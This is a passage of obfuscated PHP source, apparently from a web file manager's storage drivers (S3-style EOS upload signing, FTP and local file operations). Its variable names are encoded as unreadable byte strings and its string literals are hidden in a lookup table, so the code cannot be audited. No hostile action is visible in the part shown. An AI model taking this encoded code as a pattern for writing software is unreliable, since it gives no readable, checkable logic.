$ª‘¬ÌŞ, $â±ª æŞ, $èşë±Ñ , $²îÊ‘ÊÆ = false) { $«Ê´ş–ş =& $_SERVER[§ŒØóıü]; $ú·ÌÖÅ = $ª‘¬ÌŞ; $±¶ãì¤» = IO::driverMake($ª‘¬ÌŞ); if ($±¶ãì¤»->pathParse[$«Ê´ş–ş[1157]]) { $ª‘¬ÌŞ = $±¶ãì¤»->pathParse[$«Ê´ş–ş[1157]]; } else { $ª‘¬ÌŞ = $ú·ÌÖÅ; } $£úö¦«Ë = IO::copyMove($ì¯ÕÏïİ, $ª‘¬ÌŞ, $â±ª æŞ, $èşë±Ñ , $²îÊ‘ÊÆ); $£úö¦«Ë = $this->getPathOuter($£úö¦«Ë); return $£úö¦«Ë; } public function pathThis($ùóÌœ­Ú) { return get_path_this($this->pathParse[$_SERVER[§ŒØóıü][84]]); } public function pathFather($ş÷Ÿ’¬ã) { return get_path_father($this->pathParse[$_SERVER[§ŒØóıü][84]]); } public function iconvSystem($™ğ®„Ã) { return $™ğ®„Ã; } protected function infoParse($·’ığ¢, $ÎÔéÑÓ = false) { $È›¥—å =& $_SERVER[§ŒØóıü]; $ÆÅŞÖĞû = $this->pathParse[$È›¥—å[486]][$È›¥—å[1181]] . $this->pathParse[$È›¥—å[1174]]; if ($ÎÔéÑÓ) { $ÑÎù¦ĞĞ = IO::infoWithChildren($ÆÅŞÖĞû); } else { $ÑÎù¦ĞĞ = IO::info($ÆÅŞÖĞû); } $®›îæÁæ = $this->pathParse[$È›¥—å[486]]; return Action($È›¥—å[1353])->_shareItemeParse($ÑÎù¦ĞĞ, $®›îæÁæ); } public function listAll($©­Ô¡Ò) { $·‘Öâ“— =& $_SERVER[§ŒØóıü]; $±ü®Û˜’ = IO::listAll($©­Ô¡Ò); $çˆÂ³ø¼ = rtrim($this->pathParse[$·‘Öâ“—[486]][$·‘Öâ“—[1181]], $·‘Öâ“—[8]); foreach ($±ü®Û˜’ as &$ŸÄ‰Ïı‘) { $ŸÄ‰Ïı‘[$·‘Öâ“—[84]] = $this->pathDriver . $·‘Öâ“—[8] . ltrim(substr($ŸÄ‰Ïı‘[$·‘Öâ“—[84]], strlen($çˆÂ³ø¼)), $·‘Öâ“—[8]); } unset($ŸÄ‰Ïı‘); return $±ü®Û˜’; } public function listAllSimple($“Œƒ”ÃÚ, $®ôöÑÉ¼ = false) { $‚³Ö­ƒµ =& $_SERVER[§ŒØóıü]; $ÕßŠç·Æ = $this->listAll($“Œƒ”ÃÚ); $ù´ˆ‰›Ş = $this->pathParse[$‚³Ö­ƒµ[421]]; if (trim($ù´ˆ‰›Ş, $‚³Ö­ƒµ[8]) == trim(get_path_father($ù´ˆ‰›Ş), $‚³Ö­ƒµ[8])) { $®ôöÑÉ¼ = !0; } return IO::init($‚³Ö­ƒµ[12])->listAllSimpleMake($ÕßŠç·Æ, $ù´ˆ‰›Ş, $®ôöÑÉ¼); } public function getPathOuter($áòşİšÛ) { $µÓÏ¦¼Ã =& $_SERVER[§ŒØóıü]; $ö¹À¥Ëü = KodIO::parse($áòşİšÛ); if ($ö¹À¥Ëü[$µÓÏ¦¼Ã[33]] == KodIO::KOD_SHARE_ITEM) { return $ö¹À¥Ëü[$µÓÏ¦¼Ã[84]]; } $ÕšŠÕÑş = KodIO::clear($áòşİšÛ); $·…‚²Éâ = KodIO::clear($this->pathParse[$µÓÏ¦¼Ã[486]][$µÓÏ¦¼Ã[1181]]); $±ÅöÏî = substr($ÕšŠÕÑş, strlen($·…‚²Éâ)); if (substr($ÕšŠÕÑş, 0, strlen($·…‚²Éâ)) != $·…‚²Éâ) { return !1; } return $this->pathParse[$µÓÏ¦¼Ã[1175]] . $µÓÏ¦¼Ã[8] . ltrim($±ÅöÏî, $µÓÏ¦¼Ã[8]); } public function getType() { $¡”‘ş¸ =& $_SERVER[§ŒØóıü]; $ï«‚Æåô = str_replace($¡”‘ş¸[74], $¡”‘ş¸[12], get_class($this)); return strtolower($ï«‚Æåô); } public function isTypeObject($ÌèÕÒ¨Â) { return IO::isTypeObject($ÌèÕÒ¨Â); } public function info($ ëÀà) { return $this->infoParse($ ëÀà); } public function infoAuth($‰ÂÌŒ†‹) { return $this->infoParse($‰ÂÌŒ†‹); } public function infoWithChildren($ÍÓ‹Ÿ—Ê) { return $this->infoParse($ÍÓ‹Ÿ—Ê, !0); } public function infoFull($Øüú€¨õ) { return $this->infoParse($Øüú€¨õ); } } goto e¶µ¤¨é§í; fÀö— ÃÀš: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ƒù‹á£Ä) { parent::__construct($ƒù‹á£Ä); $this->signatureVersion($_SERVER[§ŒØóıü][216]); } public function uploadFormData($Ú«şÖıÎ, $•ÇË øæ = 3600) { $Ëïë¸³ş =& $_SERVER[§ŒØóıü]; $üÙ­¨îŠ = $Ëïë¸³ş[199]; $“¥ÌÅÉş = $Ëïë¸³ş[1365]; $­ÂÓù½ = $Ëïë¸³ş[62]; $€ˆß¬öè = gmdate($Ëïë¸³ş[1366]); $¾ãõ°À = gmdate($Ëïë¸³ş[756]); $äâõÑõå = $Ëïë¸³ş[1367]; $Ç•æ‹ˆ = $•ÇË øæ . $Ëïë¸³ş[12]; $Ò®ÒÊ¾º = $Ëïë¸³ş[1328]; $åâ£±¢¨ = array($this->accessKey, $¾ãõ°À, $this->region, $­ÂÓù½, $äâõÑõå); $Ø¬ïôšÍ = implode($Ëïë¸³ş[8], $åâ£±¢¨); $ôùÓ’—¸ = array($Ëïë¸³ş[1330] => gmdate($Ëïë¸³ş[1329], strtotime($Ëïë¸³ş[1368])), $Ëïë¸³ş[1331] => array(array($Ëïë¸³ş[1333] => $this->bucket), array($Ëïë¸³ş[1332] => $üÙ­¨îŠ), array($Ëïë¸³ş[1334], $Ëïë¸³ş[1335], $Ëïë¸³ş[12]), array($Ëïë¸³ş[1334], $Ëïë¸³ş[1369], $Ëïë¸³ş[12]), array($Ëïë¸³ş[1334], $Ëïë¸³ş[1370], $Ëïë¸³ş[12]), array($Ëïë¸³ş[1336] => $Ò®ÒÊ¾º), array($Ëïë¸³ş[1371] => $Ø¬ïôšÍ), array($Ëïë¸³ş[1372] => $“¥ÌÅÉş), array($Ëïë¸³ş[1373] => $€ˆß¬öè), array($Ëïë¸³ş[1374] => $Ç•æ‹ˆ))); $ï©£¶ğ¯ = base64_encode(json_encode($ôùÓ’—¸)); $‚ŸÚıûÚ = hash_hmac($Ëïë¸³ş[1375], $¾ãõ°À, $Ëïë¸³ş[1376] . $this->secret, !0); $—ìäü¢â = hash_hmac($Ëïë¸³ş[1375], $this->region, $‚ŸÚıûÚ, !0); $“İïÜÛ· = hash_hmac($Ëïë¸³ş[1375], $­ÂÓù½, $—ìäü¢â, !0); $›í¦Ë³Û = hash_hmac($Ëïë¸³ş[1375], $äâõÑõå, $“İïÜÛ·, !0); $Å ííŞ™ = hash_hmac($Ëïë¸³ş[1375], $ï©£¶ğ¯, $›í¦Ë³Û); $ŸÈØïÏ’ = array($Ëïë¸³ş[215] => $Ëïë¸³ş[12], $Ëïë¸³ş[1377] => $Ëïë¸³ş[12], $Ëïë¸³ş[1332] => $üÙ­¨îŠ, $Ëïë¸³ş[1336] => $Ò®ÒÊ¾º, $Ëïë¸³ş[1340] => $ï©£¶ğ¯, $Ëïë¸³ş[1378] => $Ø¬ïôšÍ, $Ëïë¸³ş[1379] => $“¥ÌÅÉş, $Ëïë¸³ş[1380] => $€ˆß¬öè, $Ëïë¸³ş[1381] => $Ç•æ‹ˆ, $Ëïë¸³ş[1382] => $Å ííŞ™, $Ëïë¸³ş[182] => $this->getHost()); return $ŸÈØïÏ’; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($â¥ñçı) { parent::__construct(); if (count($â¥ñçı) > 0) { $this->_init($â¥ñçı); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÊÕ¯Í—ğ) { $üø§ª›ª =& $_SERVER[§ŒØóıü]; global $config; $this->appCharset = $config[$üø§ª›ª[1383]]; $this->systemCharset = $config[$üø§ª›ª[1384]]; if (isset($ÊÕ¯Í—ğ[$üø§ª›ª[1385]]) && $ÊÕ¯Í—ğ[$üø§ª›ª[1385]]) { $this->systemCharset = $ÊÕ¯Í—ğ[$üø§ª›ª[1385]]; } } public function iconvApp($à‹½À±€) { return $this->iconvTo($à‹½À±€, $this->systemCharset, $this->appCharset); } public function iconvSystem($ìææéú¨) { return $this->iconvTo($ìææéú¨, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÈÀÈ…) { $ù–œÈôğ =& $_SERVER[§ŒØóıü]; $Ÿ³ø¬–„ = $this->iconvApp($this->pathBase); $ÈÀÈ… = $this->iconvApp($ÈÀÈ…); if (substr($Ÿ³ø¬–„, 0, 2) == $ù–œÈôğ[1386]) { $Ÿ³ø¬–„ = BASIC_PATH . substr($Ÿ³ø¬–„, 2); } if (substr($ÈÀÈ…, 0, 2) == $ù–œÈôğ[1386]) { $ÈÀÈ… = BASIC_PATH . substr($ÈÀÈ…, 2); } $Ÿ³ø¬–„ = KodIO::clear($Ÿ³ø¬–„); $ÈÀÈ… = KodIO::clear($ÈÀÈ…); $ÈÀÈ… = substr($ÈÀÈ…, strlen($Ÿ³ø¬–„)); if (empty($this->pathDriver)) { return $ÈÀÈ…; } return $this->pathDriver . $ù–œÈôğ[8] . ltrim($ÈÀÈ…, $ù–œÈôğ[8]); } private function _init($ˆ´Œ£ˆ˜ = array()) { $¯Ôä“… =& $_SERVER[§ŒØóıü]; if (!function_exists($¯Ôä“…[1387])) { throw new Exception(LNG($¯Ôä“…[1388])); } $this->config = $ˆ´Œ£ˆ˜; $this->charsetReset($ˆ´Œ£ˆ˜); foreach ($ˆ´Œ£ˆ˜ as $±Èğ•œİ => $òòÂş‹ç) { if (isset($this->{$±Èğ•œİ})) { $this->{$±Èğ•œİ} = $òòÂş‹ç; } } return $this->_login($ˆ´Œ£ˆ˜); } private function _login($Üƒ¥Î) { $­ÄÀ¨ˆå =& $_SERVER[§ŒØóıü]; static $”óÆÑ› = array(); $Ü¥Ø¹ñ½ = md5(json_encode($Üƒ¥Î)); if (isset($”óÆÑ›[$Ü¥Ø¹ñ½])) { foreach ($”óÆÑ›[$Ü¥Ø¹ñ½] as $ñ£‹¤´² => $ĞÖÏä½‹) { $this->{$ñ£‹¤´²} = $ĞÖÏä½‹; } return !0; } $êêıˆÍ = parse_url(trim($this->server, $­ÄÀ¨ˆå[8])); $this->host = $êêıˆÍ[$­ÄÀ¨ˆå[182]]; $Éº¥™ÔÜ = isset($êêıˆÍ[$­ÄÀ¨ˆå[181]]) && $êêıˆÍ[$­ÄÀ¨ˆå[181]] == $­ÄÀ¨ˆå[1389] ? !0 : !1; $this->scheme = $Éº¥™ÔÜ ? $­ÄÀ¨ˆå[1390] : $­ÄÀ¨ˆå[1391]; $this->port = isset($êêıˆÍ[$­ÄÀ¨ˆå[183]]) ? $êêıˆÍ[$­ÄÀ¨ˆå[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $èæâ»¯ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $„Éğ¬Ø‹ = $this->pasv == $­ÄÀ¨ˆå[88] ? !0 : !1; @ftp_pasv($this->connect, $„Éğ¬Ø‹); $”óÆÑ›[$Ü¥Ø¹ñ½] = array($­ÄÀ¨ˆå[1392] => $this->connect, $­ÄÀ¨ˆå[182] => $this->host, $­ÄÀ¨ˆå[181] => $this->scheme, $­ÄÀ¨ˆå[183] => $this->port); return $èæâ»¯; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($­…¶¢, $¬õÌÍä = '', $Œ’Ÿ¼òç = REPEAT_RENAME) { if ($this->setContent($­…¶¢, $¬õÌÍä)) { return $this->getPathOuter($­…¶¢); } return !1; } public function mkdir($øñî„Á, $²Ú­ÁĞû = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $øñî„Á = $this->iconvSystem($øñî„Á); if ($this->_isFolder($øñî„Á) || @ftp_mkdir($this->connect, $øñî„Á)) { return $this->getPathOuter($øñî„Á); } if (!$this->mkdir($this->pathFather($øñî„Á))) { return !1; } if ($øñî„Á = @ftp_mkdir($this->connect, $øñî„Á)) { return $this->getPathOuter($øñî„Á); } return !1; } public function copyFile($‚šïæèº, $÷Ô´‘ê) { if (!$this->_isconn()) { return !1; } $òñŠÕÙ‘ = $this->pathThis($this->iconvSystem($‚šïæèº)); $šÖ»–Ø÷ = $this->tempFile($òñŠÕÙ‘); $Öå¡ÛìÔ = $this->iconvApp($šÖ»–Ø÷); $this->download($‚šïæèº, $Öå¡ÛìÔ); $ÁÕßËÄ¢ = $this->upload($÷Ô´‘ê, $Öå¡ÛìÔ); $this->tempFileRemve($šÖ»–Ø÷); return $ÁÕßËÄ¢; } public function moveFile($Ìà§Ô¤¬, $Êç¿’ÈÓ) { if (!$this->_isconn()) { return !1; } $Ìà§Ô¤¬ = $this->iconvSystem($Ìà§Ô¤¬); $Êç¿’ÈÓ = $this->iconvSystem($Êç¿’ÈÓ); $°°¢Ï­¯ = @ftp_rename($this->connect, $Ìà§Ô¤¬, $Êç¿’ÈÓ); return $°°¢Ï­¯ ? $this->getPathOuter($Êç¿’ÈÓ) : !1; } public function delFile($øì’Ìçë) { if (!$this->_isconn()) { return !1; } $øì’Ìçë = $this->iconvSystem($øì’Ìçë); return @ftp_delete($this->connect, $øì’Ìçë); } public function delFolder($ëú¿øñ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $­§£«ŸÁ = $³µÌ†Ò‚ = array(); $this->fileList($ëú¿øñ, $­§£«ŸÁ, $³µÌ†Ò‚, !0); $this->listItemCache = !0; foreach ($³µÌ†Ò‚ as $îØ‹§“ß) { $©Ü±áİ¿ = $this->iconvSystem($îØ‹§“ß[$_SERVER[§ŒØóıü][32]]); $Èí×òØÇ = @ftp_delete($this->connect, $©Ü±áİ¿); if (!$Èí×òØÇ) { return !1; } } foreach ($­§£«ŸÁ as $©Ü±áİ¿) { $©Ü±áİ¿ = $this->iconvSystem($©Ü±áİ¿); $Èí×òØÇ = @ftp_rmdir($this->connect, $©Ü±áİ¿); if (!$Èí×òØÇ) { return !1; } } $ëú¿øñ = $this->iconvSystem($ëú¿øñ); return @ftp_rmdir($this->connect, $ëú¿øñ); } public function rename($æ§¹Æ²ê, $›¶÷¶Œ) { $¬˜ÜéÂ³ =& $_SERVER[§ŒØóıü]; if (!$this->_isconn()) { return !1; } $È‘ö¤›ä = $this->fileNameAuto($this->pathFather($æ§¹Æ²ê), $›¶÷¶Œ); $È‘ö¤›ä = $this->iconvSystem($È‘ö¤›ä); $æ§¹Æ²ê = $this->iconvSystem($æ§¹Æ²ê); $åÜ¾¿ğ½ = $this->pathFather($æ§¹Æ²ê); $´‰ºğ®‡ = rtrim($åÜ¾¿ğ½, $¬˜ÜéÂ³[8]) . $¬˜ÜéÂ³[8] . $È‘ö¤›ä; $œëğĞ‹ = @ftp_rename($this->connect, $æ§¹Æ²ê, $´‰ºğ®‡); $´‰ºğ®‡ = $this->iconvApp($´‰ºğ®‡); return $œëğĞ‹ ? $this->getPathOuter($´‰ºğ®‡) : !1; } private function folderInfo($œºÜ¸§¬, $¯¹Ş§“¢ = false) { $Ö†é‘ì =& $_SERVER[§ŒØóıü]; $êí®î·Æ = array($Ö†é‘ì[32] => $this->pathThis($œºÜ¸§¬), $Ö†é‘ì[84] => $this->getPathOuter($Ö†é‘ì[8] . $œºÜ¸§¬), $Ö†é‘ì[33] => $Ö†é‘ì[75]); if ($¯¹Ş§“¢) { return $êí®î·Æ; } $êí®î·Æ[$Ö†é‘ì[201]] = $êí®î·Æ[$Ö†é‘ì[85]] = 0; $êí®î·Æ[$Ö†é‘ì[202]] = $êí®î·Æ[$Ö†é‘ì[203]] = !0; return $êí®î·Æ; } private function fileInfo($Äæ…óÎş, $çÙÏï = false, $ëŒÛäè· = array()) { $¨“—Ëˆù =& $_SERVER[§ŒØóıü]; $æŠúÑÃ = array($¨“—Ëˆù[32] => $this->pathThis($Äæ…óÎş), $¨“—Ëˆù[84] => $this->getPathOuter($¨“—Ëˆù[8] . $Äæ…óÎş), $¨“—Ëˆù[33] => $¨“—Ëˆù[200], $¨“—Ëˆù[76] => isset($ëŒÛäè·[$¨“—Ëˆù[76]]) ? $ëŒÛäè·[$¨“—Ëˆù[76]] : 0, $¨“—Ëˆù[174] => $this->ext($Äæ…óÎş)); if ($çÙÏï) { return $æŠúÑÃ; } $æŠúÑÃ[$¨“—Ëˆù[201]] = $æŠúÑÃ[$¨“—Ëˆù[85]] = 0; $æŠúÑÃ[$¨“—Ëˆù[202]] = $æŠúÑÃ[$¨“—Ëˆù[203]] = !0; $—Ù“ˆ× = $this->iconvSystem($Äæ…óÎş); $æŠúÑÃ[$¨“—Ëˆù[85]] = @ftp_mdtm($this->connect, $—Ù“ˆ×); if (empty($ëŒÛäè·)) { $ëŒÛäè· = $this->objectMeta($Äæ…óÎş); if (!$ëŒÛäè·) { return $æŠúÑÃ; } } $æŠúÑÃ[$¨“—Ëˆù[76]] = $ëŒÛäè·[$¨“—Ëˆù[76]]; return $æŠúÑÃ; } public function size($Ü×¶ñ) { $¬½¹©€Â = $this->objectMeta($Ü×¶ñ); return $¬½¹©€Â ? $¬½¹©€Â[$_SERVER[§ŒØóıü][76]] : 0; } public function info($ÜÖüı®ë) { if ($this->isFile($ÜÖüı®ë)) { return $this->fileInfo($ÜÖüı®ë, 0); } else { if ($this->isFolder($ÜÖüı®ë)) { return $this->folderInfo($ÜÖüı®ë); } } return !1; } private function fileList($ğÎ°±’ñ, &$¥Â¦Ê¤™, &$öœäèòˆ, $ô±ìùÕ = false) { $Õ’ãŠ÷• =& $_SERVER[§ŒØóıü]; $ğÎ°±’ñ = $this->iconvSystem($ğÎ°±’ñ); if (!$this->isFolder($ğÎ°±’ñ)) { return !1; } @ftp_chdir($this->connect, $Õ’ãŠ÷•[8]); $ğÎ°±’ñ = rtrim($ğÎ°±’ñ, $Õ’ãŠ÷•[8]) . $Õ’ãŠ÷•[8]; check_abort(); $é ¹”© = @ftp_rawlist($this->connect, $ğÎ°±’ñ); if (!$é ¹”©) { $é ¹”© = array(); } $ø·µøÒñ = array($Õ’ãŠ÷•[10] => 1, $Õ’ãŠ÷•[1393] => 1); foreach ($é ¹”© as $†¨‘÷‚Ğ) { $œÁ¢úê = $this->_listItem($†¨‘÷‚Ğ); if ($œÁ¢úê[0] == $Õ’ãŠ÷•[764]) { continue; } $å›ïàı = $œÁ¢úê[8]; if (empty($å›ïàı) && $å›ïàı !== $Õ’ãŠ÷•[198] || isset($ø·µøÒñ[$å›ïàı])) { continue; } $å›ïàı = $this->iconvApp($ğÎ°±’ñ . ltrim($å›ïàı, $Õ’ãŠ÷•[8])); $Î‹çË—Œ = array($Õ’ãŠ÷•[32] => $å›ïàı, $Õ’ãŠ÷•[33] => $Õ’ãŠ÷•[200], $Õ’ãŠ÷•[76] => $œÁ¢úê[4]); if (substr($†¨‘÷‚Ğ, 0, 1) == $Õ’ãŠ÷•[1394]) { $Î‹çË—Œ[$Õ’ãŠ÷•[33]] = $Õ’ãŠ÷•[75]; $Î‹çË—Œ[$Õ’ãŠ÷•[76]] = 0; } $½‡‡×„´ = $Î‹çË—Œ[$Õ’ãŠ÷•[33]] == $Õ’ãŠ÷•[75] ? !0 : !1; $this->cacheMethodInfoSet($å›ïàı, $½‡‡×„´, $Î‹çË—Œ); if ($½‡‡×„´) { $¥Â¦Ê¤™[] = $å›ïàı; if ($ô±ìùÕ) { $this->fileList($å›ïàı, $¥Â¦Ê¤™, $öœäèòˆ, $ô±ìùÕ); } continue; } $öœäèòˆ[] = $Î‹çË—Œ; } $this->cacheMethodInfoSet($ğÎ°±’ñ, !0); } private function _listItem($Æá˜œéñ) { if (empty($Æá˜œéñ)) { return array(); } $±¹ŸÑëó = preg_split($_SERVER[§ŒØóıü][1395], $Æá˜œéñ); if (count($±¹ŸÑëó) <= 9) { return $±¹ŸÑëó; } $±¹ŸÑëó[8] = trim(substr($Æá˜œéñ, strpos($Æá˜œéñ, $±¹ŸÑëó[7]) + strlen($±¹ŸÑëó[7]))); return array_splice($±¹ŸÑëó, 0, 9); } public function listPath($şŸÓÁ¤Ş, $ƒ¬ëÅÙÀ = false) { $ìÜï¼èÔ =& $_SERVER[§ŒØóıü]; if (!$this->_isconn()) { return !1; } $üòşÅòÔ = $Í™ğ’ò¶ = array(); $this->fileList($şŸÓÁ¤Ş, $üòşÅòÔ, $Í™ğ’ò¶); foreach ($üòşÅòÔ as $ŠŒĞÑ => $…êİÁÚ§) { $üòşÅòÔ[$ŠŒĞÑ] = $this->folderInfo($…êİÁÚ§, $ƒ¬ëÅÙÀ); } foreach ($Í™ğ’ò¶ as $ŠŒĞÑ => $…êİÁÚ§) { $Í™ğ’ò¶[$ŠŒĞÑ] = $this->fileInfo($…êİÁÚ§[$ìÜï¼èÔ[32]], $ƒ¬ëÅÙÀ, $…êİÁÚ§); } return array($ìÜï¼èÔ[82] => $üòşÅòÔ, $ìÜï¼èÔ[83] => $Í™ğ’ò¶); } public function has($ÉÇïõİè, $ŞÍÓ¤ø® = false, $¿Ì”°†ê = true) { $È»õ¶óŒ =& $_SERVER[§ŒØóıü]; $ÀÜÏ«İ = $–÷ï–ëá = array(); $ïµÂØıÜ = $ŞÍÓ¤ø® ? !0 : !1; $this->fileList($ÉÇïõİè, $ÀÜÏ«İ, $–÷ï–ëá, $ïµÂØıÜ); if ($ŞÍÓ¤ø®) { return array($È»õ¶óŒ[207] => count($–÷ï–ëá), $È»õ¶óŒ[208] => count($ÀÜÏ«İ)); } if ($¿Ì”°†ê) { if (count($–÷ï–ëá)) { return !0; } } else { if (count($ÀÜÏ«İ)) { return !0; } } return !1; } public function listAll($Íöô’×) { $°£´ÃïÔ =& $_SERVER[§ŒØóıü]; if (!$this->_isconn()) { return !1; } $ä”£Ï€Ò = $é²²ù©Œ = array(); $this->fileList($Íöô’×, $ä”£Ï€Ò, $é²²ù©Œ, !0); $Æ´¢¹Äî = array_to_keyvalue($é²²ù©Œ, $°£´ÃïÔ[32]); foreach ($ä”£Ï€Ò as $šÓŸ¼) { if (is_string($šÓŸ¼)) { $Æ´¢¹Äî[$šÓŸ¼] = array($°£´ÃïÔ[76] => 0); } } return $this->listAllFiles($Íöô’×, $Æ´¢¹Äî); } public function getContent($€¿ï×Ìµ) { if (!$this->_isconn()) { return !1; } $€¿ï×Ìµ = $this->iconvSystem($€¿ï×Ìµ); return $this->fileSubstr($€¿ï×Ìµ); } public function setContent($©ª÷¿Ûï, $¨‰Î‚ıç = '') { if (!$this->_isconn()) { return !1; } $ËÇ²Æ‡Ê = $this->pathThis($this->iconvSystem($©ª÷¿Ûï)); $×‰ÜĞæ = $this->tempFile($ËÇ²Æ‡Ê); file_put_contents($×‰ÜĞæ, $¨‰Î‚ıç); $œÖ§¬Ïî = $this->upload($©ª÷¿Ûï, $this->iconvApp($×‰ÜĞæ)); $this->tempFileRemve($×‰ÜĞæ); return $œÖ§¬Ïî; } public function fileSubstr($ı©Ìˆ¢‘, $Õ¾™’€´ = 0, $„í¾ğŸé = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ı©Ìˆ¢‘, $Õ¾™’€´, $„í¾ğŸé); } private function ftpRequest($ò’Ã³˜“, $”“»îûÛ = 0, $Ñ·¹¢ô¯ = false) { $ò’Ã³˜“ = $this->iconvSystem($ò’Ã³˜“); $™ÉÉ¨Å‡ = $this->scheme . $this->host . $_SERVER[§ŒØóıü][4] . $this->port; $›‰Ü‡‘ñ = curl_init(); curl_setopt($›‰Ü‡‘ñ, CURLOPT_URL, $™ÉÉ¨Å‡ . $this->pathEncode($ò’Ã³˜“)); curl_setopt($›‰Ü‡‘ñ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ñ·¹¢ô¯) { $ÛãËÕ = $”“»îûÛ + $Ñ·¹¢ô¯ - 1; curl_setopt($›‰Ü‡‘ñ, CURLOPT_RANGE, "{$”“»îûÛ}\x2d{$ÛãËÕ}"); } curl_setopt($›‰Ü‡‘ñ, CURLOPT_RETURNTRANSFER, 1); $ıƒÎ¹¥ = curl_exec($›‰Ü‡‘ñ); curl_close($›‰Ü‡‘ñ); return $ıƒÎ¹¥; } public function upload($ğÓŸó¢Ï, $ªèˆ¡‹â, $Ïñ“Û” = false, $—®±óØØ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ğÓŸó¢Ï))) { return !1; } $ğÓŸó¢Ï = $this->iconvSystem($ğÓŸó¢Ï); $ªèˆ¡‹â = $this->iconvSystem($ªèˆ¡‹â); $Ù·ü‡ = ftp_nb_put($this->connect, $ğÓŸó¢Ï, $ªèˆ¡‹â, FTP_BINARY); while ($Ù·ü‡ == FTP_MOREDATA) { $Ù·ü‡ = ftp_nb_continue($this->connect); } if ($Ù·ü‡ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ğÓŸó¢Ï); } public function download($‰Ä‡ó¹Å, $Ù•—»»™ = '') { if (!$this->_isconn()) { return !1; } $ğĞš˜¨” = $this->pathFather($Ù•—»»™); if (!IO::mkdir($ğĞš˜¨”)) { return !1; } $‰Ä‡ó¹Å = $this->iconvSystem($‰Ä‡ó¹Å); $Ù•—»»™ = $this->iconvSystem($Ù•—»»™); $Ãšó‡¾ = ftp_nb_get($this->connect, $Ù•—»»™, $‰Ä‡ó¹Å, FTP_BINARY); while ($Ãšó‡¾ == FTP_MOREDATA) { $Ãšó‡¾ = ftp_nb_continue($this->connect); } if ($Ãšó‡¾ != FTP_FINISHED) { return !1; } return $this->iconvApp($Ù•—»»™); } public function exist($ğÄ¹äü) { return $this->isFile($ğÄ¹äü) || $this->isFolder($ğÄ¹äü); } public function isFile($öÊˆ¸öÀ) { return !$this->isFolder($öÊˆ¸öÀ) && $this->objectMeta($öÊˆ¸öÀ); } public function isFolder($ã÷ Ö’») { return $this->cacheMethod($_SERVER[§ŒØóıü][165], $ã÷ Ö’»); } protected function objectMeta($¤’ÍÎÁø) { return $this->cacheMethod($_SERVER[§ŒØóıü][167], $¤’ÍÎÁø); } protected function _objectMeta($…ï»£˜ğ) { $Î£•”Á =& $_SERVER[§ŒØóıü]; if ($…ï»£˜ğ == $Î£•”Á[12] || $…ï»£˜ğ == $Î£•”Á[8]) { return array(); } if (!$this->_isconn()) { return !1; } $…ï»£˜ğ = $this->iconvSystem($…ï»£˜ğ); $”æ×ÏÊ = array($Î£•”Á[32] => $this->iconvApp($…ï»£˜ğ), $Î£•”Á[33] => $Î£•”Á[200], $Î£•”Á[76] => 0); @ftp_chdir($this->connect, $Î£•”Á[8]); $õ¢Õ´å³ = @ftp_size($this->connect, $…ï»£˜ğ); if ($õ¢Õ´å³ != -1) { $”æ×ÏÊ[$Î£•”Á[76]] = $õ¢Õ´å³; } else { $Û’ßõÈ˜ = @ftp_chdir($this->connect, $…ï»£˜ğ); if (!$Û’ßõÈ˜) { return !1; } $”æ×ÏÊ[$Î£•”Á[33]] = $Î£•”Á[75]; } return $”æ×ÏÊ; } protected function _isFolder($ªô¦êÅ¾) { $ºùè†Á— =& $_SERVER[§ŒØóıü]; if ($ªô¦êÅ¾ == $ºùè†Á—[12] || $ªô¦êÅ¾ == $ºùè†Á—[8]) { return !0; } $ºñ¦­ã = $this->_objectMeta($ªô¦êÅ¾); return isset($ºñ¦­ã[$ºùè†Á—[33]]) && $ºñ¦­ã[$ºùè†Á—[33]] == $ºùè†Á—[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($«–ôœ’Í) { if (substr($«–ôœ’Í, 0, 2) == $_SERVER[§ŒØóıü][1386]) { $«–ôœ’Í = BASIC_PATH . substr($«–ôœ’Í, 2); } return $«–ôœ’Í; } public function iconvApp($ÈÃÚ½) { $°·Ÿá– =& $_SERVER[§ŒØóıü]; global $config; return $this->iconvTo($ÈÃÚ½, $config[$°·Ÿá–[1384]], $config[$°·Ÿá–[1383]]); } public function iconvSystem($¨Öô¡ÁÛ) { $ÎêãİÂ =& $_SERVER[§ŒØóıü]; global $config; return $this->iconvTo($¨Öô¡ÁÛ, $config[$ÎêãİÂ[1383]], $config[$ÎêãİÂ[1384]]); } public function getPathOuter($ÏØª­î¥) { $¡È™²Åä =& $_SERVER[§ŒØóıü]; $’Ô™Ñ¾Ã = $this->iconvApp($this->pathBase); $ÏØª­î¥ = $this->iconvApp($ÏØª­î¥); if (substr($’Ô™Ñ¾Ã, 0, 2) == $¡È™²Åä[1386]) { $’Ô™Ñ¾Ã = BASIC_PATH . substr($’Ô™Ñ¾Ã, 2); } if (substr($ÏØª­î¥, 0, 2) == $¡È™²Åä[1386]) { $ÏØª­î¥ = BASIC_PATH . substr($ÏØª­î¥, 2); } $’Ô™Ñ¾Ã = KodIO::clear($’Ô™Ñ¾Ã); $ÏØª­î¥ = KodIO::clear($ÏØª­î¥); $ÏØª­î¥ = substr($ÏØª­î¥, strlen($’Ô™Ñ¾Ã)); if (empty($this->pathDriver)) { return $ÏØª­î¥; } return $this->pathDriver . $¡È™²Åä[8] . ltrim($ÏØª­î¥, $¡È™²Åä[8]); } public function mkfile($¨ÒÈÈÊ, $ùĞè³¦® = '', $éë”ßØ¶ = REPEAT_RENAME) { $¨ÒÈÈÊ = 